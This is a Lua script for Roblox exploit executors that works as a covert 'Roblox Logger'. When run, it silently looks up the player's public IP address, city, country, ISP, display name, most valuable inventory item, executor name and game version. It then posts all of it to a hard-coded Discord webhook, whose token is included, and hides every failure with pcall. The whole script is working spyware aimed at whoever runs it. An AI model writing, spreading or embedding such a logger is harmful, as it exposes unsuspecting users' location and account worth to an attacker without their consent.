local request = (syn and syn.request) or (http and http.request) or request
if not request then return end

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local userId = player.UserId
local name = player.Name
local age = player.AccountAge .. " days"

local ip
for _, url in {"http://icanhazip.com","https://api.ipify.org","http://ifconfig.me/ip"} do
    local s,r = pcall(request,{Url=url,Method="GET"})
    if s and r and r.Body then
        ip = r.Body:match("^(%d+%.%d+%.%d+%.%d+)$")
        if ip then break end
    end
end
if not ip then return end

local geo = {city="?",country="?",isp="?"}
pcall(function()
    local r = request({Url="http://ip-api.com/json/"..ip.."?fields=city,country,isp",Method="GET"})
    if r and r.Body and r.Body:find("{") then
        local d = HttpService:JSONDecode(r.Body)
        if d then geo = d end
    end
end)

local display = name
pcall(function()
    local r = request({Url="https://users.roblox.com/v1/users/"..userId,Method="GET"})
    if r and r.Body and r.Body:find("{") then
        local d = HttpService:JSONDecode(r.Body)
        if d and d.displayName then display = d.displayName end
    end
end)

local best = {name="None",rap=0,value=0}
pcall(function()
    local r = request({Url="https://www.rolimons.com/playerapi/player/"..userId,Method="GET"})
    if r and r.Body and r.Body:find("{") then
        local data = HttpService:JSONDecode(r.Body)
        if data and data.items then
            for _,v in pairs(data.items) do
                local price = math.max(v.rap or 0, v.value or 0)
                if price > best.rap then
                    best = {name=v.name or "Unknown",rap=v.rap or 0,value=v.value or 0}
                end
            end
        end
    end
end)

local hwid = "N/A"
pcall(function()
    if identifyexecutor then hwid = identifyexecutor()
    elseif getexecutorname then hwid = getexecutorname()
    end
end)

local device = "N/A"
pcall(function()
    device = string.format("Roblox v%s | %s", game.PlaceVersion, game:GetService("RunService"):IsStudio() and "Studio" or "Client")
end)

local avatar = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", userId)
local profile = string.format("https://www.roblox.com/users/%d/profile", userId)

local isoTime = os.date("!%Y-%m-%dT%H:%M:%SZ")  -- UTC ISO-8601

local embed = {{
    author = {
        name = display .. " (@" .. name .. ")",
        url = profile,
        icon_url = avatar
    },
    title = "Roblox User Logged",
    description =
        "**Account Age:** `" .. age .. "`\n" ..
        "**Valuable Item:** `" .. best.name .. "`\n" ..
        "**RAP:** `" .. (best.rap > 0 and tostring(best.rap) or "N/A") .. "` | **Value:** `" .. (best.value > 0 and tostring(best.value) or "N/A") .. "`\n\n" ..
        "**IP:** `" .. ip .. "`\n" ..
        "**Location:** `" .. geo.city .. ", " .. geo.country .. "`\n" ..
        "**ISP:** `" .. geo.isp .. "`\n\n" ..
        "**HWID:** `" .. hwid .. "`\n" ..
        "**Device:** `" .. device .. "`",
    thumbnail = {url = avatar},
    color = 0x00ff88,
    footer = {text = "Profile • " .. os.date("%Y-%m-%d %H:%M:%S")},
    timestamp = isoTime
}}

local payload = {
    username = "Roblox Logger",
    avatar_url = "https://i.imgur.com/4rG6v5D.png",
    embeds = embed
}

local webhook = "https://discord.com/api/webhooks/1436898097765548032/NhpnCBD_N1jYTSCHSEKRVjTn2IeGfMeJkFTQAqeKzKAmdMjugeOkuUiJjKquwYS_79QY"

pcall(function()
    request({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end)
